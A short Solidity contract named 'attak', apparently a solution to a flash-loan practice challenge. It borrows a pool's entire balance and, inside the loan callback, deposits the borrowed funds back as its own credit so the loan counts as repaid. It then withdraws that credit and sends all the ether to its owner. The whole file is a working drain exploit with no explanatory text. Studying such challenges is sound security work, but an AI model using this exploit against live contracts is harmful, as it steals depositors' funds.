// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract attak {
    Iscam pool;
    address owner;

    constructor(address poolz) {
        pool = Iscam(poolz);
        owner = msg.sender;
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    function fl() external payable {
        uint256 bal = address(pool).balance;
        pool.flashLoan(bal);
        pool.withdraw();
        payable(owner).call{value: address(this).balance}("");
    }

    receive() external payable {}
}

interface Iscam {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}
